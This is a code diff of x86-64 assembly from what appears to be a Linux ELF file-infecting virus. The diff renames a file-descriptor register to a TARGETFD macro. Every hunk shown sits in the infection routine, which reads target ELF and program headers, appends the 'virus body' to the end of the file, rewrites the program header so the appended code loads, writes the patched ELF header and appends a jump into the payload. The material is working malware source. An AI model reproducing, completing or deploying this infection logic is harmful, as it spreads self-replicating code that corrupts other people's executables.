@@ -392,13 +392,14 @@ process_file:
 
         cmp rax, 0                                          
         jbe .next_file
-	; fd in r9
-        mov r9, rax
+	; fd in TARGETFD
+  %define TARGETFD r9
+        mov TARGETFD, rax
 
 	; ----------------------------------------------
 	; Read target elf header
 	; ----------------------------------------------
-        mov SYS_ARG0, r9                                         
+        mov SYS_ARG0, TARGETFD                                         
         lea SYS_ARG1, [elfheader]
         mov SYS_ARG2, EHDR_SIZE
         mov SYS_ARG3, 0
@@ -432,7 +433,7 @@ process_file:
 	; Load phdr
 	; -------------------------------------------
 	 .loop_phdr
-	mov SYS_ARG0, r9                                        
+	mov SYS_ARG0, TARGETFD                                        
         lea SYS_ARG1, [programheader]                               
         mov SYS_ARG2word, word [elfheader + e_hdr.phentsize]                           
         mov SYS_ARG3, r8                                         
@@ -462,7 +463,7 @@ process_file:
 	; ----------------------------------------
 	; Stat file
 	; ----------------------------------------
-        mov SYS_ARG0, r9
+        mov SYS_ARG0, TARGETFD
         mov SYS_ARG1, r15                                    
         mov SYS_NUM, SYS_FSTAT
         syscall
@@ -470,7 +471,7 @@ process_file:
 	; ----------------------------------------
         ; get target EOF
 	; ----------------------------------------
-        mov SYS_ARG0, r9                                
+        mov SYS_ARG0, TARGETFD                                
         mov SYS_ARG1, 0                                
         mov SYS_ARG2, SEEK_END
         mov SYS_NUM, SYS_LSEEK
@@ -485,7 +486,7 @@ process_file:
 	; ----------------------------------------
         ; append virus body to EOF
 	; ----------------------------------------
-        mov SYS_ARG0, r9                                     
+        mov SYS_ARG0, TARGETFD                                     
         lea SYS_ARG1, [rbp + main]                        
         mov SYS_ARG2, end - main  
         mov SYS_ARG3, rax                                   
@@ -505,7 +506,7 @@ process_file:
         mov qword [programheader + p_hdr.align], 0x200000                
         add qword [programheader + p_hdr.filesz], end - main    
         add qword [programheader + p_hdr.memsz], end - main    
-        mov SYS_ARG0, r9                                   
+        mov SYS_ARG0, TARGETFD                                   
         mov SYS_ARG1, r15                                    
         lea SYS_ARG1, [programheader + p_hdr.type]                     
         mov SYS_ARG2word, word [elfheader + e_hdr.phentsize]                 
@@ -529,7 +530,7 @@ process_file:
 	; -------------------------------
         ; write patched ehdr
 	; -------------------------------
-        mov SYS_ARG0, r9                                     
+        mov SYS_ARG0, TARGETFD                                     
         lea SYS_ARG1, [elfheader]                           
         mov SYS_ARG2, EHDR_SIZE                             
         mov SYS_ARG3, 0                                     
@@ -540,7 +541,7 @@ process_file:
 	; Write patched jmp
 	; -------------------------------
         ; getting target new EOF
-        mov SYS_ARG0, r9                                   
+        mov SYS_ARG0, TARGETFD                                   
         mov SYS_ARG1, 0                                    
         mov SYS_ARG2, SEEK_END
         mov SYS_NUM, SYS_LSEEK
@@ -559,7 +560,7 @@ process_file:
 	; -------------------------------
         ; writing patched jmp to EOF
 	; -------------------------------
-        mov SYS_ARG0, r9                                   
+        mov SYS_ARG0, TARGETFD                                   
         lea SYS_ARG1, [relativejmp]                            
         mov SYS_ARG2, 5                                      
         mov SYS_ARG3, rax                                    
